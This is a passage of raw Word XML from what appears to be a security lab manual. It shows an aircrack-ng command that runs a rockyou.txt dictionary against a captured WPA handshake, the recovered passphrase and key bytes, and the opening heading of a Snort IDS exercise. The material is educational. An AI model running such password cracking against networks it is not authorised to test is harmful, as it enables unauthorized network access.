          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>- 1 root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">root   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">2796 Oct </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>5 01</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>35 a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>heros-01.k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>l</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hyperlink r:id="rId60">
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-6"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>oot@ka</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>li</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>~</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>#</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rack-ng -a 2 athe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">os-01.cap -w </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sha</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>word</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sts</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>[00</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>00</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">52] 84564 keys </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed (1648.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1682" w:right="4685"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>EY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>FO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">UND! [ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>c12345 ]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="460"/>
      </w:pPr>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Key     :   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>CA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">53 9B 5C 23 16 70 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>84 53 16 9E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>FB 14 77 49</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2190" w:right="1636"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>A9 7A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">A0 2D </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">F BB 2B C3 8D 26 D2 33 54 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:t>D 3A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>43</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="456"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>rans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Key  :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:t>5 F4 BA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-25"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">F 57 6F 87 04 58 02 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>D 18 62 37 8A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>53</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2058"/>
      </w:pPr>
      <w:r>
        <w:t>38 86 F1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A2 CA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:t>D 4A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">8D D6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">C </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">D 0D 6C </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>D C1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>F</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2058"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">81 58 81 C2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">D 58 7F </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-18"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>DE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>13 34 D6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>AE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>FE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>05</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="460" w:right="1632" w:firstLine="1598"/>
      </w:pPr>
      <w:r>
        <w:t>F6 53 B8 CA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">A0 70 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">C 02 1B </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>5F 7A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>DA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>7A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">C 7D </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>AC  0A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">12 4C 3D </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">D </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">D </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>C0 2B C9 5A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>3 C1 65</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>8 5C</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8" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="156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100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 15                                                                                                           </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ate:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="4194" w:right="4157"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-7"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-4"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>DS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="106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60" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="620" w:space="190"/>
            <w:col w:w="8890"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>o de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ons</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>rus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>on De</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>on Sys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>(IDS) us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ng snort</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
